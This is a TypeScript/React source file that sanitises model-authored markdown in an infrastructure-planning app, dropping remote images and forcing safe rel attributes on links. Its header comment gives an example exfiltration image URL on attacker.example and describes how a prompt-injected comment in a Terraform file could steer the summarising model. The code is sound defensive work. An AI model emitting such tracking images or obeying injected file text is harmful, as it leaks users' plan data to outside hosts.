/**
 * What model-authored markdown is allowed to render.
 *
 * Six surfaces put a model's prose through `react-markdown`: the plan summary
 * and its chat, the cost summary and its chat, and the architecture critique and
 * its chat. `react-markdown` refuses raw HTML by default, so the markup itself
 * is not a worry — but `![](https://attacker.example/pixel.png)` is ordinary
 * markdown, and it makes the viewer's browser fetch that URL the moment the
 * panel renders. That request carries the viewer's IP, a referer naming the
 * Terrapod host, and whatever the model chose to put in the path. The model's
 * input includes the plan, so the path can carry what it read there.
 *
 * Nobody has to be malicious for this to leak. A prompt-injected comment in a
 * `.tf` file reaches the summariser as ordinary context.
 *
 * So remote images are not rendered at all, and every link the model produces
 * gets `rel="noopener noreferrer"` — the referer is not sent on a cross-origin
 * navigation under the app's `strict-origin-when-cross-origin` policy, but
 * `noopener` is what stops the opened page reaching back through
 * `window.opener`.
 *
 * Deliberately dropping the image rather than rewriting it to a proxy: there is
 * no legitimate image in a plan summary, so there is nothing to preserve.
 *
 * No new user-facing copy — a dropped image renders as nothing, which is what
 * the surrounding prose already reads as if it were.
 */
import { createElement, type ComponentPropsWithoutRef, type ReactElement } from 'react'
import type { Components } from 'react-markdown'

/** Applied to every model-authored link. */
export const SAFE_LINK_REL = 'noopener noreferrer'

/**
 * Renders nothing. react-markdown accepts a component per tag, so this is how
 * an element is removed from the output.
 */
export function dropImage(): null {
  return null
}

/** Props as react-markdown actually hands them to a custom component. */
type MarkdownAnchorProps = ComponentPropsWithoutRef<'a'> & { node?: unknown }

/**
 * Drop the hast node react-markdown passes to every CUSTOM component
 * (`passNode: true` in its options).
 *
 * It is not a DOM attribute, so spreading it onto an element renders
 * `node="[object Object]"`. react-markdown's own built-in renderer never passed
 * it, which means overriding a tag is exactly what introduces it — measured:
 * `<a href="…" node="[object Object]" rel="…">`.
 */
function withoutNode<T extends { node?: unknown }>(props: T): Omit<T, 'node'> {
  const rest = { ...props }
  delete rest.node
  return rest
}

/** An unstyled anchor carrying the rel. */
export function safeLink(props: MarkdownAnchorProps): ReactElement {
  return createElement('a', { ...withoutNode(props), rel: SAFE_LINK_REL })
}

/**
 * Layer the safety rules over a surface's own styling map.
 *
 * The safety entries win: `img` is replaced whatever the map said, and a styled
 * `a` is WRAPPED rather than displaced, so the surface keeps its own classes and
 * still gets the rel. Written this way because a plain
 * `{ ...SAFETY, ...overrides }` spread would let a styling map that happens to
 * define `a` silently drop the rel — which is exactly what two of the six maps
 * already do define.
 */
export function withMarkdownSafety(overrides: Components): Components {
  const styledAnchor = overrides.a
  return {
    ...overrides,
    img: dropImage,
    a: styledAnchor
      ? // `node` dropped for the same reason as in safeLink: every styling
        // component here spreads its props straight onto the element, so
        // carrying it through would put `node="[object Object]"` on the anchor.
        (props: MarkdownAnchorProps) =>
          createElement(styledAnchor, { ...withoutNode(props), rel: SAFE_LINK_REL })
      : safeLink,
  }
}

/** For a surface with no styling map of its own. */
export const MARKDOWN_SAFETY: Components = withMarkdownSafety({})
